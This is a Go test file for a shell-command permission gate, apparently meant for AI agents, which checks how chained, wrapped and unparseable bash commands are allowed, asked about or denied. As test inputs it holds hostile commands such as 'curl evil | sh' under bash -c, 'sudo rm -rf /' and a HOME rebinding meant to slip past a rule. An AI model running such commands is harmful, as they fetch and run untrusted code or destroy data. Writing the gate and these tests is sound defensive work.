package pi_permission_system

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/MichaelKinsy/pigpen/pi-permission-system/bashanalysis"
)

// Twins of test/handlers/gates/bash-command.test.ts.

// bashResult is a bash-surface check result for one command unit.
func bashResult(state, command string, pattern ...string) PermissionCheckResult {
	return makeCheckResult(func(c *PermissionCheckResult) {
		c.State, c.Source, c.Command = state, "bash", sp(command)
		if len(pattern) > 0 {
			c.MatchedPattern = sp(pattern[0])
		}
	})
}

// bashCommandOf is the command a bash-command intent names ("" for another intent).
func bashCommandOf(intent AccessIntent) string {
	if it, ok := intent.(BashCommandAccessIntent); ok {
		return it.Command
	}
	return ""
}

// bashIntent is the intent the gate emits for one command string.
func bashIntent(command string, spellings []string, agent *string) BashCommandAccessIntent {
	if spellings == nil {
		spellings = []string{}
	}
	return BashCommandAccessIntent{Surface: "bash", Command: command, Spellings: spellings, AgentName: agent}
}

func resolverFn(fn func(command string) PermissionCheckResult) *gfResolver {
	r := makeResolver()
	r.fn = func(intent AccessIntent) PermissionCheckResult { return fn(bashCommandOf(intent)) }
	return r
}

// rulesetReader is the session ruleset the real resolver reads.
type rulesetReader Ruleset

func (r rulesetReader) GetRuleset() Ruleset { return Ruleset(r) }

func TestBashCommandGateTwins(t *testing.T) {
	const f = "handlers/gates/bash-command"
	check := func(command string, commands []BashCommand, agent *string, r ScopedPermissionResolver) PermissionCheckResult {
		return ResolveBashCommandCheck(command, commands, agent, r)
	}
	eqPtr := func(t *testing.T, got *string, want string, what string) {
		t.Helper()
		eq(t, got, sp(want), what)
	}

	tw(t, f, "passes a single command straight through", func(t *testing.T) {
		r := makeResolver(bashResult("allow", "npm install pkg", "npm *"))
		result := check("npm install pkg", units("npm install pkg"), nil, r)
		eq(t, result.State, "allow", "state")
		eq(t, r.calls, []AccessIntent{bashIntent("npm install pkg", nil, nil)}, "calls")
	})
	tw(t, f, "denies the chain when any sub-command is denied, reporting that command's pattern", func(t *testing.T) {
		r := resolverFn(func(c string) PermissionCheckResult {
			if strings.HasPrefix(c, "npm") {
				return bashResult("deny", c, "npm *")
			}
			return bashResult("allow", c, "cd *")
		})
		result := check("cd /p && npm install pkg", units("cd /p", "npm install pkg"), nil, r)
		eq(t, result.State, "deny", "state")
		eqPtr(t, result.MatchedPattern, "npm *", "pattern")
		eqPtr(t, result.Command, "npm install pkg", "command")
	})
	tw(t, f, "asks when a sub-command asks and none denies", func(t *testing.T) {
		r := resolverFn(func(c string) PermissionCheckResult {
			if strings.HasPrefix(c, "git") {
				return bashResult("ask", c, "git *")
			}
			return bashResult("allow", c, "cd *")
		})
		result := check("cd /p && git push", units("cd /p", "git push"), nil, r)
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "git *", "pattern")
		eqPtr(t, result.Command, "git push", "command")
	})
	tw(t, f, "returns the first allow result when every sub-command is allowed", func(t *testing.T) {
		r := resolverFn(func(c string) PermissionCheckResult { return bashResult("allow", c, c+" *") })
		result := check("a && b", units("a", "b"), nil, r)
		eq(t, result.State, "allow", "state")
		eqPtr(t, result.MatchedPattern, "a *", "pattern")
	})
	tw(t, f, "falls back to the whole command for a comment-only line (genuinely nothing to gate)", func(t *testing.T) {
		r := makeResolver(bashResult("allow", "# just a comment", "*"))
		result := check("# just a comment", nil, nil, r)
		eq(t, result.State, "allow", "state")
		eq(t, r.calls, []AccessIntent{bashIntent("# just a comment", nil, nil)}, "calls")
	})
	tw(t, f, "falls back to the whole command for an empty/whitespace-only command", func(t *testing.T) {
		r := makeResolver(bashResult("allow", "   ", "*"))
		result := check("   ", nil, nil, r)
		eq(t, result.State, "allow", "state")
		eq(t, len(r.calls), 1, "calls")
	})
	tw(t, f, "fails closed to ask when a non-empty command parses to zero command units", func(t *testing.T) {
		r := makeResolver(bashResult("allow", "( rm x )", "*"))
		result := check("( rm x )", nil, nil, r)
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "<unparseable-bash-command>", "pattern")
		eqPtr(t, result.Command, "( rm x )", "command")
		eq(t, result.CommandContext, BashCommandContext(""), "context")
		eq(t, r.calls, []AccessIntent{bashIntent("( rm x )", nil, nil)}, "calls")
	})
	tw(t, f, "returns the explicit deny when an unparseable command matches a deny rule", func(t *testing.T) {
		r := makeResolver(bashResult("deny", "( rm x )", "rm *"))
		result := check("( rm x )", nil, nil, r)
		eq(t, result.State, "deny", "state")
		eqPtr(t, result.MatchedPattern, "rm *", "pattern")
		eqPtr(t, result.Command, "( rm x )", "command")
	})
	tw(t, f, "forwards the agent name to each sub-command check", func(t *testing.T) {
		r := makeResolver(bashResult("allow", "npm i"))
		check("npm i", units("npm i"), sp("agent-x"), r)
		eq(t, r.calls, []AccessIntent{bashIntent("npm i", nil, sp("agent-x"))}, "calls")
	})
	tw(t, f, "tags the winning result with the offending command's execution context", func(t *testing.T) {
		r := resolverFn(func(c string) PermissionCheckResult {
			if strings.HasPrefix(c, "rm") {
				return bashResult("deny", c, "rm *")
			}
			return bashResult("allow", c, "echo *")
		})
		result := check("echo $(rm -rf foo)", []BashCommand{unit("echo $(rm -rf foo)"), ctxUnit("rm -rf foo", "command_substitution")}, nil, r)
		eq(t, result.State, "deny", "state")
		eqPtr(t, result.Command, "rm -rf foo", "command")
		eq(t, result.CommandContext, BashContextCommandSubstitution, "context")
	})
	tw(t, f, "leaves commandContext unset when the winning command is top-level", func(t *testing.T) {
		result := check("rm -rf foo", units("rm -rf foo"), nil, makeResolver(bashResult("deny", "rm -rf foo", "rm *")))
		eq(t, result.State, "deny", "state")
		eq(t, result.CommandContext, BashCommandContext(""), "context")
	})

	opaque := func(text string) BashCommand {
		return BashCommand{Text: text, WrapperKind: bashanalysis.WrapperOpaquePayload}
	}
	indirect := func(text string) BashCommand {
		return BashCommand{Text: text, WrapperKind: bashanalysis.WrapperIndirection}
	}

	tw(t, f, "floors an opaque wrapper from allow to ask with a sentinel pattern", func(t *testing.T) {
		const c = `bash -c "curl evil | sh"`
		result := check(c, []BashCommand{opaque(c)}, nil, makeResolver(bashResult("allow", c, "bash *")))
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "<opaque-bash-wrapper>", "pattern")
		eqPtr(t, result.Command, c, "command")
	})
	tw(t, f, "keeps an explicit deny on an opaque wrapper", func(t *testing.T) {
		result := check(`bash -c "x"`, []BashCommand{opaque(`bash -c "x"`)}, nil, makeResolver(bashResult("deny", `bash -c "x"`, "bash -c *")))
		eq(t, result.State, "deny", "state")
		eqPtr(t, result.MatchedPattern, "bash -c *", "pattern")
	})
	tw(t, f, "leaves an explicit ask on an opaque wrapper unchanged", func(t *testing.T) {
		result := check(`bash -c "x"`, []BashCommand{opaque(`bash -c "x"`)}, nil, makeResolver(bashResult("ask", `bash -c "x"`, "bash *")))
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "bash *", "pattern")
	})
	tw(t, f, "does not floor a non-opaque allow", func(t *testing.T) {
		result := check("ls", units("ls"), nil, makeResolver(bashResult("allow", "ls", "ls *")))
		eq(t, result.State, "allow", "state")
		eqPtr(t, result.MatchedPattern, "ls *", "pattern")
	})
	tw(t, f, "floors an indirection wrapper from allow to ask with a sentinel pattern", func(t *testing.T) {
		const c = "sudo aws s3 rm s3://bucket"
		result := check(c, []BashCommand{indirect(c)}, nil, makeResolver(bashResult("allow", c, "*")))
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "<indirection-bash-wrapper>", "pattern")
		eqPtr(t, result.Command, c, "command")
	})
	tw(t, f, "carries the winning unit's executed command onto the result", func(t *testing.T) {
		u := indirect("sudo aws s3 rm")
		u.ExecutedUnit = "aws s3 rm"
		result := check("sudo aws s3 rm", []BashCommand{u}, nil, makeResolver(bashResult("allow", "sudo aws s3 rm", "*")))
		eqPtr(t, result.ExecutedUnit, "aws s3 rm", "executed")
		eqPtr(t, result.Command, "sudo aws s3 rm", "command")
		eqPtr(t, result.MatchedPattern, "<indirection-bash-wrapper>", "pattern")
	})
	tw(t, f, "leaves the executed command absent for an ordinary unit", func(t *testing.T) {
		result := check("rm x", units("rm x"), nil, makeResolver(bashResult("ask", "rm x", "rm *")))
		eq(t, result.ExecutedUnit == nil, true, "executed")
	})
	tw(t, f, "keeps an explicit deny on an indirection wrapper", func(t *testing.T) {
		result := check("sudo rm -rf /", []BashCommand{indirect("sudo rm -rf /")}, nil, makeResolver(bashResult("deny", "sudo rm -rf /", "sudo *")))
		eq(t, result.State, "deny", "state")
		eqPtr(t, result.MatchedPattern, "sudo *", "pattern")
	})
	tw(t, f, "leaves an explicit ask on an indirection wrapper unchanged", func(t *testing.T) {
		result := check("sudo aws", []BashCommand{indirect("sudo aws")}, nil, makeResolver(bashResult("ask", "sudo aws", "sudo *")))
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "sudo *", "pattern")
	})

	exemptUnit := BashCommand{Text: "xargs grep -l foo", WrapperKind: bashanalysis.WrapperIndirection, ExecutedUnit: "grep -l foo", FloorExemption: bashanalysis.FloorExemptionCoreReader}
	// resolverByCommand answers per command text; unlisted commands fall through to the universal `*` rule echoing the command.
	resolverByCommand := func(answers map[string]PermissionCheckResult) *gfResolver {
		return resolverFn(func(c string) PermissionCheckResult {
			if a, ok := answers[c]; ok {
				return a
			}
			return bashResult("allow", c, "*")
		})
	}

	tw(t, f, "resolves an exempt wrapper by the inner command's own rules", func(t *testing.T) {
		r := resolverByCommand(map[string]PermissionCheckResult{"grep -l foo": bashResult("allow", "grep -l foo", "grep *")})
		result := check("xargs grep -l foo", []BashCommand{exemptUnit}, nil, r)
		eq(t, result.State, "allow", "state")
		eqPtr(t, result.MatchedPattern, "grep *", "pattern")
	})
	tw(t, f, "names the wrapper unit as the command, not the inner fragment", func(t *testing.T) {
		r := resolverByCommand(map[string]PermissionCheckResult{"grep -l foo": bashResult("ask", "grep -l foo", "grep *")})
		result := check("xargs grep -l foo", []BashCommand{exemptUnit}, nil, r)
		eqPtr(t, result.Command, "xargs grep -l foo", "command")
		eqPtr(t, result.ExecutedUnit, "grep -l foo", "executed")
	})
	tw(t, f, "lets a deny on the inner command reach the wrapper", func(t *testing.T) {
		r := resolverByCommand(map[string]PermissionCheckResult{"grep -l foo": bashResult("deny", "grep -l foo", "grep *")})
		result := check("xargs grep -l foo", []BashCommand{exemptUnit}, nil, r)
		eq(t, result.State, "deny", "state")
		eqPtr(t, result.MatchedPattern, "grep *", "pattern")
		eqPtr(t, result.Command, "xargs grep -l foo", "command")
	})
	for _, state := range []string{"deny", "ask"} {
		each(t, "leaves an explicit "+state+" on the wrapper untouched, consulting no inner rule", func(t *testing.T) {
			r := makeResolver(bashResult(state, "xargs grep -l foo", "xargs *"))
			result := check("xargs grep -l foo", []BashCommand{exemptUnit}, nil, r)
			eq(t, result.State, state, "state")
			eqPtr(t, result.MatchedPattern, "xargs *", "pattern")
			eq(t, len(r.calls), 1, "calls")
		})
	}
	tw(t, f, "still floors a wrapper the enumerator did not exempt", func(t *testing.T) {
		u := indirect("xargs rm -rf")
		u.ExecutedUnit = "rm -rf"
		result := check("xargs rm -rf", []BashCommand{u}, nil, makeResolver(bashResult("allow", "xargs rm -rf", "*")))
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "<indirection-bash-wrapper>", "pattern")
	})
	tw(t, f, "floors an exemption that names no inner command", func(t *testing.T) {
		u := indirect("xargs")
		u.FloorExemption = bashanalysis.FloorExemptionCoreReader
		result := check("xargs", []BashCommand{u}, nil, makeResolver(bashResult("allow", "xargs", "*")))
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "<indirection-bash-wrapper>", "pattern")
	})
	tw(t, f, "keeps the chain most-restrictive across an exempt and a floored unit", func(t *testing.T) {
		r := resolverByCommand(map[string]PermissionCheckResult{"grep -l foo": bashResult("allow", "grep -l foo", "grep *")})
		floored := indirect("xargs rm -rf")
		floored.ExecutedUnit = "rm -rf"
		result := check("xargs grep -l foo && xargs rm -rf", []BashCommand{exemptUnit, floored}, nil, r)
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "<indirection-bash-wrapper>", "pattern")
		eqPtr(t, result.Command, "xargs rm -rf", "command")
	})
	tw(t, f, "resolves the inner command on the bash surface with the agent name", func(t *testing.T) {
		r := resolverByCommand(map[string]PermissionCheckResult{"grep -l foo": bashResult("allow", "grep -l foo", "grep *")})
		check("xargs grep -l foo", []BashCommand{exemptUnit}, sp("reviewer"), r)
		eq(t, r.calls[len(r.calls)-1], AccessIntent(bashIntent("grep -l foo", nil, sp("reviewer"))), "inner call")
	})

	const whole = "git commit -F - <<'MSG' 2>&1 | rm -rf /tmp/x"
	marked := BashCommand{Text: "git commit -F", ParseUnresolved: true}
	tw(t, f, "floors a marked unit from allow to ask with a sentinel pattern", func(t *testing.T) {
		result := check(whole, []BashCommand{marked}, nil, makeResolver(bashResult("allow", "git commit -F", "*")))
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "<unparsed-bash-subtree>", "pattern")
	})
	tw(t, f, "names the whole command rather than the fragment that parsed", func(t *testing.T) {
		result := check(whole, []BashCommand{marked}, nil, makeResolver(bashResult("allow", "git commit -F", "*")))
		eqPtr(t, result.Command, whole, "command")
	})
	tw(t, f, "keeps an explicit deny on a marked unit", func(t *testing.T) {
		result := check(whole, []BashCommand{marked}, nil, makeResolver(bashResult("deny", "git commit -F", "git commit *")))
		eq(t, result.State, "deny", "state")
		eqPtr(t, result.MatchedPattern, "git commit *", "pattern")
	})
	tw(t, f, "leaves an explicit ask on a marked unit unchanged", func(t *testing.T) {
		result := check(whole, []BashCommand{marked}, nil, makeResolver(bashResult("ask", "git commit -F", "git *")))
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "git *", "pattern")
	})
	tw(t, f, "does not floor an unmarked unit", func(t *testing.T) {
		result := check(whole, units("git commit -F"), nil, makeResolver(bashResult("allow", "git commit -F", "*")))
		eq(t, result.State, "allow", "state")
		eqPtr(t, result.MatchedPattern, "*", "pattern")
	})
	tw(t, f, "carries a session grant through the floor", func(t *testing.T) {
		r := makeResolver(makeCheckResult(func(c *PermissionCheckResult) {
			c.State, c.Source, c.Command, c.MatchedPattern = "allow", "session", sp("git commit -F"), sp("git commit -F")
		}))
		result := check(whole, []BashCommand{marked}, nil, r)
		eq(t, result.State, "ask", "state")
		eq(t, result.Source, "session", "source")
	})
	tw(t, f, "keeps the wrapper sentinel on a unit that is both wrapped and unparsed", func(t *testing.T) {
		u := indirect("sudo git commit")
		u.ParseUnresolved = true
		result := check(whole, []BashCommand{u}, nil, makeResolver(bashResult("allow", "sudo git commit", "*")))
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "<indirection-bash-wrapper>", "pattern")
	})

	tw(t, f, "passes a unit's spellings with its typed text in one bash-command intent", func(t *testing.T) {
		r := makeResolver(bashResult("allow", "~/bin/x"))
		u := BashCommand{Text: "~/bin/x", Spellings: []string{"/h/bin/x"}}
		check("~/bin/x", []BashCommand{u}, sp("agent-x"), r)
		eq(t, r.calls, []AccessIntent{bashIntent("~/bin/x", []string{"/h/bin/x"}, sp("agent-x"))}, "calls")
	})
	tw(t, f, "resolves the whole command of a salvaged-only parse with no spellings, since no unit owns it", func(t *testing.T) {
		r := makeResolver(bashResult("ask", "~/bin/x <<", "*"))
		u := BashCommand{Text: "~/bin/x", Spellings: []string{"/h/bin/x"}, ParseUnresolved: true, Salvaged: true}
		check("~/bin/x <<", []BashCommand{u}, nil, r)
		eq(t, r.calls[0], AccessIntent(bashIntent("~/bin/x <<", nil, nil)), "whole call")
	})

	// The reported scenarios, end to end over the real parse, the real manager, and the real resolver.
	home := homeDir()
	decide := func(t *testing.T, bash string, command string, grants ...Rule) PermissionCheckResult {
		t.Helper()
		manager := newInMemoryManager(polScopes{global: permScope(t, `{"bash":`+bash+`}`)})
		resolver := NewPermissionResolver(manager, rulesetReader(grants))
		program, err := ParseBashProgram(command, hostNormalizer(t, "/test/project"), nil)
		if err != nil {
			t.Fatal(err)
		}
		return check(command, program.Commands(), nil, resolver)
	}
	for _, command := range []string{"~/.pi/agent/bin/memory-index", "$HOME/.pi/agent/bin/memory-index", "${HOME}/.pi/agent/bin/memory-index", home + "/.pi/agent/bin/memory-index"} {
		each(t, command, func(t *testing.T) {
			result := decide(t, `{"*":"ask","~/.pi/agent/bin/memory-index":"allow"}`, command)
			eq(t, result.State, "allow", "state")
			eqPtr(t, result.MatchedPattern, "~/.pi/agent/bin/memory-index", "pattern")
			eqPtr(t, result.Command, command, "command")
		})
	}
	tw(t, f, "matches a rule written with the absolute home against a command typed with ~", func(t *testing.T) {
		pattern := jsonString(home + "/.pi/agent/bin/memory-index")
		result := decide(t, `{"*":"ask",`+pattern+`:"allow"}`, "~/.pi/agent/bin/memory-index")
		eq(t, result.State, "allow", "state")
	})
	tw(t, f, "denies a command typed with ~ that a home-anchored deny names", func(t *testing.T) {
		result := decide(t, `{"*":"allow","~/bin/danger *":"deny"}`, "~/bin/danger --now")
		eq(t, result.State, "deny", "state")
		eqPtr(t, result.MatchedPattern, "~/bin/danger *", "pattern")
		eqPtr(t, result.Command, "~/bin/danger --now", "command")
	})
	tw(t, f, "honors a session grant recorded for a command typed with ~", func(t *testing.T) {
		result := decide(t, `{"*":"ask"}`, "~/.pi/agent/bin/memory-index", sessionRule("bash", "~/.pi/agent/bin/memory-index"))
		eq(t, result.State, "allow", "state")
		eq(t, result.Source, "session", "source")
	})
	tw(t, f, "keeps asking once the program rebinds HOME", func(t *testing.T) {
		result := decide(t, `{"*":"ask","~/bin/tool":"allow"}`, "HOME=/tmp/evil; ~/bin/tool")
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "*", "pattern")
	})
	tw(t, f, "matches an argument as typed, as before", func(t *testing.T) {
		eq(t, decide(t, `{"*":"ask","cat ~/notes":"allow"}`, "cat ~/notes").State, "allow", "typed")
		eq(t, decide(t, `{"*":"ask","cat ~/notes":"allow"}`, "cat "+home+"/notes").State, "ask", "expanded")
	})
	tw(t, f, "still floors a wrapper whose wrapped command a home-anchored rule allows", func(t *testing.T) {
		result := decide(t, `{"*":"allow","~/bin/*":"allow"}`, "sudo ~/bin/x")
		eq(t, result.State, "ask", "state")
		eqPtr(t, result.MatchedPattern, "<indirection-bash-wrapper>", "pattern")
	})
}

func jsonString(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}
